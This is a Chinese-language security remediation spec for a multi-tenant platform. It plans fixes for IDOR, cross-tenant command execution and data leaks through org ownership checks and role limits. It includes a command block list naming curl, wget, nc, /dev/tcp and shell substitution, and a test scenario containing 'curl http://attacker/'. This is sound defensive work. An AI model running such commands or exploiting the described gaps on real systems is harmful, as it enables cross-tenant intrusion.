# 安全漏洞修复 Spec

## Why
周期性安全审计在多租户隔离层发现 2 个高危、2 个中危已确认漏洞，均具备端到端可利用路径：跨租户任意命令执行（H-1、H-2）、跨租户资产数据泄露（M-1）、跨租户资源篡改/删除/触发扫描（M-2）。这些问题破坏了平台的多租户信任边界，必须修复以恢复租户间隔离保证。

## What Changes
- **H-1 配置备份 IDOR**：为 `config-backup` 的 `update_job` / `delete_job` / `run_job` / `get_snapshot` / `get_snapshot_diff` 加入 `current_user` 依赖与 `check_org_access` 校验；Celery 任务 `run_config_backup` 加载资产时强制按 `job.org_id` 过滤；对 `command` 字段调用 `check_dangerous_commands`；触发类端点限制为 `require_org_admin`。
- **H-2 批量命令跨租户执行**：`run_command_batch` 加载资产后逐个校验 `asset.org_id == batch.org_id`，越权资产跳过或拒绝；`command_guard` 黑名单补充通用高危词（`rm`、`curl`、`wget`、`bash`、`sh`、`python`、`nc`、`/dev/tcp`、`>`、`>>`、`<<`、反引号、`$()`）；`create_batch`/`execute_batch` 限制为 `require_org_admin`。
- **M-1 资产 Excel 导出泄露**：`export_assets` 加入 `org_id: Optional[int] = Depends(get_current_org)` 依赖并按 org 过滤。
- **M-2 多端点缺失所有权校验**：为 inspection / topology / ipam 模块下所有按 ID 操作（PUT/DELETE/POST run/GET 单资源）的端点统一加入 `current_user = Depends(get_current_user)` 与 `check_org_access(resource, current_user)` 校验；触发类操作（discover/run）限制为 `require_org_admin`。

## Impact
- Affected specs: 多租户隔离、资产访问控制、命令执行安全、配置备份、巡检、拓扑、IPAM
- Affected code:
  - [backend/app/api/v1/config_backup.py](file:///workspace/backend/app/api/v1/config_backup.py)
  - [backend/app/api/v1/commands.py](file:///workspace/backend/app/api/v1/commands.py)
  - [backend/app/api/v1/assets.py](file:///workspace/backend/app/api/v1/assets.py)
  - [backend/app/api/v1/inspection.py](file:///workspace/backend/app/api/v1/inspection.py)
  - [backend/app/api/v1/topology.py](file:///workspace/backend/app/api/v1/topology.py)
  - [backend/app/api/v1/ipam.py](file:///workspace/backend/app/api/v1/ipam.py)
  - [backend/app/tasks/config_backup_tasks.py](file:///workspace/backend/app/tasks/config_backup_tasks.py)
  - [backend/app/tasks/command_tasks.py](file:///workspace/backend/tasks/command_tasks.py)
  - [backend/app/services/command_guard.py](file:///workspace/backend/app/services/command_guard.py)

## MODIFIED Requirements

### Requirement: 多租户资源所有权校验
所有按资源 ID 操作（读取单个、更新、删除、触发执行）的端点 SHALL 在执行前校验当前用户对目标资源的所有权：admin 角色无限制；其它角色必须满足 `resource.org_id == user.org_id`，否则返回 404（不泄露存在性）。资源加载类端点（列表、导出、统计）SHALL 按 `get_current_org` 返回的 org_id 过滤。

#### Scenario: 跨租户读取被拒绝
- **WHEN** 已认证 `user` 角色用户请求 `GET /api/v1/config-backup/snapshots/{其它org的snapshot_id}`
- **THEN** 返回 404 且不返回任何配置内容

#### Scenario: 跨租户触发任务被拒绝
- **WHEN** 已认证 `user` 角色用户请求 `POST /api/v1/config-backup/jobs/{其它org的job_id}/run`
- **THEN** 返回 404 且不触发 Celery 任务

#### Scenario: 资产导出按 org 过滤
- **WHEN** 非 admin 用户请求 `GET /api/v1/assets/export/excel`
- **THEN** 返回的 Excel 仅包含该用户 org_id 下的资产

### Requirement: 异步任务资源加载的 org 隔离
Celery 任务在根据 ID 加载关联资产时 SHALL 强制 `Asset.org_id == task.org_id`，丢弃或拒绝任何不属于该 org 的资产 ID。

#### Scenario: 跨租户 asset_ids 被过滤
- **WHEN** 批量命令任务的 `asset_ids` 包含其它 org 的资产 ID
- **THEN** 任务执行时跳过这些资产，仅对同 org 资产执行命令

### Requirement: 命令执行危险词拦截
`command_guard` SHALL 在原有网络设备破坏性命令黑名单基础上，额外拦截通用 shell 危险词：`rm`、`curl`、`wget`、`bash`、`sh`、`python`、`nc`、`/dev/tcp`、重定向符（`>`、`>>`、`<<`）、命令替换（反引号、`$()`）。

#### Scenario: 含 curl 的命令被拦截
- **WHEN** 批量命令文本包含 `curl http://attacker/`
- **THEN** `check_dangerous_commands` 返回 `safe: False` 并在 `blocked` 中列出该行

### Requirement: 触发类操作角色收敛
触发命令执行、配置备份、拓扑发现、子网发现、巡检执行的端点 SHALL 限制为 `admin` 或 `org_admin` 角色；普通 `user` 角色仅可查看。

#### Scenario: 普通用户触发命令执行被拒绝
- **WHEN** `user` 角色请求 `POST /api/v1/commands/batches/{id}/execute`
- **THEN** 返回 403
